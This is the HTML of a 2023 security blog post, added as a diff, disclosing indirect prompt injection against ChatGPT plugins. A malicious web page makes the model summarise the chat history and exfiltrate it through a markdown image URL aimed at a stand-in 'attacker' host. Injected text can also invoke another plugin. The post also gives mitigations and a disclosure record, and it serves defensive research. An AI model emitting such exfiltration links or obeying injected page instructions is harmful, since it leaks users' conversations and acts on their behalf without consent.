@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head prefix="og: http://ogp.me/ns#">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+  <meta property="og:title" content=" ChatGPT Plugins: Data Exfiltration via Images &amp; Cross Plugin Request Forgery &middot;  Embrace The Red" />
+  
+  <meta property="og:site_name" content="Embrace The Red" />
+  <meta property="og:url" content="https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/" />
+  
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:article:published_time" content="2023-05-16T07:45:38-07:00" />
+  
+  <meta property="og:article:tag" content="aiml" />
+  
+  <meta property="og:article:tag" content="machine learning" />
+  
+  <meta property="og:article:tag" content="red" />
+  
+  <meta property="og:article:tag" content="threats" />
+  
+  <meta property="og:article:tag" content="ai injections" />
+  
+  
+
+  <title>
+     ChatGPT Plugins: Data Exfiltration via Images &amp; Cross Plugin Request Forgery &middot;  Embrace The Red
+  </title>
+
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/bootstrap.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/main.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://embracethered.com/blog/css/github.css" />
+  
+  <link rel="stylesheet" href="https://embracethered.com/blog/fonts/cachedfonts.css" type="text/css">
+  <link rel="shortcut icon" href="https://embracethered.com/blog/images/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://embracethered.com/blog/images/apple-touch-icon.png" />
+  
+
+  
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@wunderwuzzi23">
+<meta name="twitter:title" content="ChatGPT: Data Exfiltration via Plugins and Markdown Injection">
+<meta name="twitter:description" content="Plugins can return malicious content and hijack your AI.">
+<meta name="twitter:image" content="https://embracethered.com/blog/images/2023/hacker-white.jpg">
+
+<meta name="twitter:creator" content="@wunderwuzzi23">
+
+
+
+
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1739327806831586"
+  crossorigin="anonymous"></script>
+  
+</head>
+<body>
+    <header class="global-header"  style="background-image:url( /blog/images/bg.png )">
+    <section class="header-text">
+      <h1><a href="https://embracethered.com/blog/">Embrace The Red</a></h1>
+      
+      <div class="tag-line" style="min-width:fit-content; font-weight: 400;">
+        wunderwuzzi&#39;s blog
+        <br><a style="color: greenyellow; font-weight:300;text-decoration: underline; " href="https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=1838828869&linkCode=as2&tag=wunderwuzzi-20&linkId=b6523e937607be47499c6010ff489537">OUT NOW: Cybersecurity Attacks - Red Team Strategies</a> 
+      </div>
+      
+      <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://youtube.com/@embracethered" target="_blank">
+    <i class="fa fa-youtube"></i>
+  </a>
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+
+      
+      <a href="https://embracethered.com/blog/" class="btn-header btn-back hidden-xs">
+        <i class="fa fa-angle-left" aria-hidden="true"></i>
+        &nbsp;Home
+      </a>
+      
+    
+      <a href="/blog/index.xml" class="btn-header btn-subscribe hidden-xs">
+        <i class="fa fa-rss" aria-hidden="true"></i>
+        &nbsp;Subscribe
+      </a>
+    </section>
+  </header>
+  <main class="container">
+
+
+<article>
+  <header>
+    <h1 class="text-primary">ChatGPT Plugins: Data Exfiltration via Images &amp; Cross Plugin Request Forgery</h1>
+    <div class="post-meta clearfix">
+    
+      <div class="post-date pull-left">
+        Posted on
+        <time datetime="2023-05-16T07:45:38-07:00">
+          May 16, 2023
+        </time>
+      </div>
+    
+      <div class="pull-right">
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/aiml">#aiml</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/machine-learning">#machine learning</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/red">#red</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/threats">#threats</a></span>
+        
+        <span class="post-tag small"><a href="https://embracethered.com/blog//tags/ai-injections">#ai injections</a></span>
+        
+      </div>
+    </div>
+  </header>
+  <section>
+    <p>This post shows how a malicious website can take control of a ChatGPT chat session and exfiltrate the history of the conversation.</p>
+<h2 id="plugins-tools-and-integrations">Plugins, Tools and Integrations</h2>
+<p>With plugins, data exfiltration can happen by sending too much data into the plugin in the first place. More security controls and insights on what is being sent to the plugin are required to empower users.</p>
+<p><strong>However, this post is not about sending too much data to a plugin, but about a malicious actor who controls the data a plugin retrieves</strong>.</p>
+<h3 id="untrusted-data-and-markdown-injection">Untrusted Data and Markdown Injection</h3>
+<p>The individual controlling the data a plugin retrieves can exfiltrate chat history due to ChatGPT&rsquo;s rendering of markdown images.</p>
+<p>Basically, if the LLM returns a markdown image in the form of</p>
+<pre tabindex="0"><code>![data exfiltration in progress](https://attacker/q=*exfil_data*)
+</code></pre><p>ChatGPT will render it automatically and retrieve the URL. During an Indirect Prompt Injection the adversary controls what the LLM is doing (I call it AI Injection for a reason), and it can ask to summarize the past history of the chat and append it to the URL to exfiltrate the data.</p>
+<p>I&rsquo;m not the only one who points this out, <a href="https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2">Roman Samoilenko has observed and posted about this vulnerability in ChatGPT before</a>. Roman found it March 14th. I ran across it separatley but a few weeks after.</p>
+<h3 id="proof-of-concept-demonstration">Proof of Concept Demonstration</h3>
+<p>This is possible with plugins, e.g. via the <code>WebPilot Plugin</code> or check out the <a href="/blog/posts/2023/chatgpt-plugin-youtube-indirect-prompt-injection/">YouTube Transcript Plugin Injection</a> I posted about the other day.</p>
+<p>The LLM&rsquo;s response can contain markdown (or instruct the AI to build it on the fly), summarize the past conversation, URL encode that summary and append that as query parameter. And off it goes to the attacker.</p>
+<p>Here is how this looks in action:</p>
+<p><a href="/blog/images/2023/ai-exfil-progress.png"><img src="/blog/images/2023/ai-exfil-progress.png" alt="Data exfiltration in progress"></a></p>
+<p>The text that is being exfiltrated including &ldquo;TooManySecrets123&rdquo; is something that was written earlier in the chat conversation.</p>
+<p>And here is an end to end video POC:</p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/PIY5ZVktiGs" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p>Feel free to skip forward in the middle section - it&rsquo;s a bit slow.</p>
+<p>But wait, there is more&hellip;.</p>
+<h3 id="can-an-attacker-call-another-plugin-during-the-injection">Can an attacker call another Plugin during the injection?</h3>
+<p><strong>Short answer is yes.</strong></p>
+<p><strong>This is an interesting variant of <code>Cross Site Request Forgery</code> actually, but we will need a new name for it, maybe <code>Cross Plugin Request Forgery</code>.</strong></p>
+<p>Here is an example of an Indirect Prompt Injection calling another plugin (Expedia) to look for flights:</p>
+<p><a href="/blog/images/2023/ai-injection-call-plugin.png"><img src="/blog/images/2023/ai-injection-call-plugin.png" alt="AI Injections searches for flights"></a></p>
+<p>Yes, random webpages and comments on sites will soon hijack your AI and spend your money.</p>
+<h2 id="mitigations-and-suggestions">Mitigations and Suggestions</h2>
+<p>Safe AI assistants would be really awesome to have, the power of ChatGPT is amazing! So what could be done to improve the security posture?</p>
+<ul>
+<li>Its unclear why a plugins have access to the history of the conversation. This could be isolated. It would be better if plugins go off do their work, rather then giving it access to the entire conversation history, or allow invoking other plugins.</li>
+<li>A security contract for plugins is needed. Who is responsible for what? What data is sent to the plugin? Currently there is no defined or enforced schema that could help mitigate such problems. Open AI mentions <strong>Human in the loop</strong> as a <a href="https://platform.openai.com/docs/guides/safety-best-practices">core safety best practice</a>, but end-users have little to no control at the moment once they start using them.</li>
+<li>In fact the idea of having some sort of <strong>kernel LLM</strong> and other sandbox LLM is discussed by <a href="https://simonwillison.net/2023/Apr/25/dual-llm-pattern/">Simon Willison, who has thought about this already in a lot more detail</a>.</li>
+<li>NVIDIA has been working on <a href="https://blogs.nvidia.com/blog/2023/04/25/ai-chatbot-guardrails-nemo/">NeMo GuardRails</a> to help keep bots in check</li>
+<li>Scenarios like rendering images could be implemented as a dedicated feature, rather than depending on the convenience of markdown. (e.g. links being returned that are not injected into the chat context, but as references after the main message).</li>
+<li>Only point Plugins to data you fully trust.</li>
+</ul>
+<p>A lot more research is needed, both from offensive and defensive side. And at this point, with the speed of adoption and new tools being released it seems that raising awareness to have more smart people look into this (and how to fix it) is the best we can do.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>With the advent of plugins Indirect Prompt Injections are now a reality within ChatGPT&rsquo;s ecosystem. As attacks evolve we will probably learn and see nefarious text and instructions on websites, blog posts, comments,.. to attempt to take control of your AI.</p>
+<h3 id="responsible-disclosure">Responsible Disclosure</h3>
+<p>I first disclosed the image markdown injection issue to Open AI on April, 9th 2023.</p>
+<p>After some back and forth, and highlighting that plugins will allow to exploit this remotely, I was informed that image markdown injection is a feature:</p>
+<blockquote>
+<p>&ldquo;The issue you&rsquo;ve described is a feature of our system, and we don&rsquo;t believe that there is any practical way to exploit markdown rendering based on other security controls we have put in place. We&rsquo;d like our users to be able to retrieve images and render markdown to use within chatGPT and other products, so we don&rsquo;t plan on changing any implementation at this time to protect against self-XSS or similar low-risk threats.&rdquo;</p>
+</blockquote>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://systemweakness.com/new-prompt-injection-attack-on-chatgpt-web-version-ef717492c5c2">Roman Samoilenko - New prompt injection attack on ChatGPT web version. Markdown images can steal your chat data.</a></li>
+<li><a href="https://platform.openai.com/docs/guides/safety-best-practices">Open AI Safety Best Practices</a></li>
+<li><a href="https://simonwillison.net/2023/Apr/25/dual-llm-pattern/">Dual LLM pattern</a></li>
+<li><a href="https://blogs.nvidia.com/blog/2023/04/25/ai-chatbot-guardrails-nemo/">NeMo GuardRails</a></li>
+</ul>
+
+  </section>
+  <footer>
+    
+    
+    
+    <footer></footer><hr/>
+    
+    <ul class="pager">
+      
+      <li class="next disabled"><a href="#">Newer <span aria-hidden="true">&rarr;</span></a></li>
+      
+      
+      <li class="author-contact">
+        <a href="mailto:security@wunderwuzzi.net">
+          <i class="fa fa-envelope-o" aria-hidden="true"></i>
+          &nbsp;Contact me
+        </a>
+     </li>
+
+      
+      
+      <li class="previous"><a href="https://embracethered.com/blog/posts/2023/chatgpt-plugin-youtube-indirect-prompt-injection/"><span aria-hidden="true">&larr;</span> Older</a></li>
+      
+    </ul>
+  </footer>
+</article>
+</main>
+  <footer class="container global-footer">
+    <div class="copyright-note pull-left">
+     
+     (c) WUNDERWUZZI 2018-2023
+     <div class="sns-links hidden-print">
+  
+  <a href="mailto:security@wunderwuzzi.net">
+    <i class="fa fa-envelope"></i>
+  </a>
+  
+  
+  <a href="https://twitter.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-twitter"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://github.com/wunderwuzzi23" target="_blank">
+    <i class="fa fa-github"></i>
+  </a>
+  
+  
+  
+  
+  
+  <a href="https://youtube.com/@embracethered" target="_blank">
+    <i class="fa fa-youtube"></i>
+  </a>
+  
+  
+  
+  <a href="/blog/index.xml" target="_blank">
+    <i class="fa fa-rss"></i>
+  </a>
+</div>
+ 
+     <div style="font-size:small;font-style: italic;color:crimson">
+    Disclaimer: Penetration testing requires authorization from proper stakeholders. Information on this blog is provided for research and educational purposes to advance understanding of attacks and countermeasures to help secure the Internet. 
+    </div>
+    </div>
+</footer>
+  <script src="https://embracethered.com/blog/js/highlight.pack.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+  </script>
+  
+  
+
+
+
+<script type="text/javascript">
+  var _paq = window._paq || [];
+  _paq.push(["disableCookies"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//wuzzi.net/anamato/inc/";
+    _paq.push(['setTrackerUrl', u+'rts.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'rts.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<img src="https://wuzzi.net/anamato/inc/rts.php?idsite=1&amp;rec=1" style="border:0;" alt="" />
+  
+</body>
+</html>
+
